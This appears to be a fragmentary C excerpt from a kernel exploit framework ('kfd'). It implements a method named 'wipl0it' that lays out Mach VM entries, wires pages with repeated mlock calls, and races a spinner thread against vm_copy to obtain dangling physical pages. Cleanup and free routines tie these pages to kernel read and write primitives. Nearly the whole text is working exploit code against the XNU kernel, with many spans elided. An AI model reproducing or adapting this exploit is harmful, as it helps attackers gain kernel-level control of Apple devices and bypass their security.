...
const u64 wipl0it_vme1_size = pages(1);
const u64 wipl0it_vme2_size = pages(1);
const u64 wipl0it_vme4_size = pages(1);

// Forward declarations for helper functions.
void* wipl0it_helper_spinner_pthread(void* arg);
...
void wipl0it_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct wipl0it_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
}

void wipl0it_run(struct kfd* kfd)
{
    struct wipl0it_data* wipl0it = (struct wipl0it_data*)(kfd->puaf.puaf_method_data);
     ...
     */
    u64 wipl0it_vme3_size = pages(kfd->puaf.number_of_puaf_pages);
    vm_size_t copy_size = wipl0it_vme1_size + wipl0it_vme2_size + wipl0it_vme3_size;
    wipl0it->copy_size = copy_size;
    ...
    wipl0it->copy_src_address = src_address;

    vm_address_t vme1_src_address = src_address;
    vm_address_t vme2_src_address = vme1_src_address + wipl0it_vme1_size;
    vm_address_t vme3_src_address = vme2_src_address + wipl0it_vme2_size;
    assert_mach(vm_allocate(mach_task_self(), &vme1_src_address, wipl0it_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_src_address, wipl0it_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme3_src_address, wipl0it_vme3_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    ...
    vm_size_t dst_size = copy_size + wipl0it_vme4_size;
    assert_mach(vm_allocate(mach_task_self(), &dst_address, dst_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    wipl0it->copy_dst_address = dst_address;

    vm_address_t vme1_dst_address = dst_address;
    vm_address_t vme2_dst_address = vme1_dst_address + wipl0it_vme1_size;
    vm_address_t vme3_dst_address = vme2_dst_address + wipl0it_vme2_size;
    vm_address_t vme4_dst_address = vme3_dst_address + wipl0it_vme3_size;
    vm_prot_t cur_protection = VM_PROT_DEFAULT;
    vm_prot_t max_protection = VM_PROT_ALL;
    assert_mach(vm_allocate(mach_task_self(), &vme1_dst_address, wipl0it_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_dst_address, wipl0it_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_remap(mach_task_self(), &vme2_dst_address, wipl0it_vme2_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
        mach_task_self(), vme2_dst_address, FALSE, &cur_protection, &max_protection, VM_INHERIT_DEFAULT));
    assert_mach(vm_allocate(mach_task_self(), &vme3_dst_address, wipl0it_vme3_size + wipl0it_vme4_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_protect(mach_task_self(), vme4_dst_address, wipl0it_vme4_size, FALSE, VM_PROT_READ));

    memset((void*)(dst_address), 'B', copy_size);

    for (u64 i = 0; i < UINT16_MAX; i++) {
        assert_bsd(mlock((void*)(vme1_dst_address), wipl0it_vme1_size));
    }

    assert_bsd(mlock((void*)(vme2_dst_address), wipl0it_vme2_size));
    ...
    assert_bsd(pthread_create(&spinner_thread, NULL, wipl0it_helper_spinner_pthread, kfd));

    while (!atomic_load(&wipl0it->spinner_thread_started)) {
        usleep(10);
    }

    assert_mach(vm_copy(mach_task_self(), src_address, copy_size, dst_address));
    atomic_store(&wipl0it->main_thread_returned, true);
     ...
     */
    assert_mach(vm_deallocate(mach_task_self(), vme4_dst_address, wipl0it_vme4_size));
...
void wipl0it_cleanup(struct kfd* kfd)
{
    struct wipl0it_data* wipl0it = (struct wipl0it_data*)(kfd->puaf.puaf_method_data);
    ...
    assert_mach(vm_deallocate(mach_task_self(), wipl0it->copy_src_address, wipl0it->copy_size));

    vm_address_t address1 = wipl0it->copy_dst_address;
    vm_size_t size1 = min_puaf_page_uaddr - wipl0it->copy_dst_address;
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (wipl0it->copy_dst_address + wipl0it->copy_size) - address2;
...
void wipl0it_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
...
void* wipl0it_helper_spinner_pthread(void* arg)
{
    ...
    atomic_store(&wipl0it->spinner_thread_started, true);

    while (!atomic_load(&wipl0it->main_thread_returned)) {
        kern_return_t kret = mlock((void*)(wipl0it->copy_dst_address), wipl0it->copy_size);
